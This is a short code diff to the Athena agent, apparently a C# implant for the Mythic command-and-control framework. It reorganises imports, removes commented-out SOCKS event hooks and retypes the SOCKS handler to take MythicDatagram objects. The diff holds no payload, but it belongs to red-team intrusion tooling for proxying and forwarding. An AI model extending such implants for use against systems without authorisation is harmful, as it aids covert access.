@@ -1,10 +1,9 @@
 using Athena.Commands;
-using Athena.Commands.Model;
+using Athena.Models.Comms.SMB;
 using Athena.Models;
-using Athena.Models.Athena.Commands;
+using Athena.Models.Commands;
 using Athena.Models.Mythic.Checkin;
 using Athena.Models.Mythic.Tasks;
-using Athena.Models.Mythic.Response;
 using Athena.Utilities;
 using Athena.Models.Config;
 using System;
@@ -16,6 +15,9 @@ using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
 using Athena.Handler.Common;
+using Athena.Handler.Proxy;
+using Athena.Models.Proxy;
+using Athena.Models.Responses;
 
 namespace Athena
 {
@@ -38,8 +40,6 @@ namespace Athena
             this.commandHandler.SetSleepAndJitter += SetSleepAndJitter;
             this.commandHandler.StartForwarder += StartForwarder;
             this.commandHandler.StopForwarder += StopForwarder;
-            //this.commandHandler.StartSocks += StartSocks;
-            //this.commandHandler.StopSocks += StopSocks;
             this.commandHandler.ExitRequested += ExitRequested;
             this.commandHandler.SetProfile += SetProfile;
             this.commandHandler.ListForwarders += ListForwarders;
@@ -449,7 +449,7 @@ profiles.Add("Athena.Profiles.SMB");
         /// Handles SOCKS messages received from the Mythic server
         /// </summary>
         /// <param name="socks">List of SocksMessages</param>
-        private async Task HandleSocks(List<SocksMessage> socks)
+        private async Task HandleSocks(List<MythicDatagram> socks)
         {
             foreach(var sm in socks)
             {
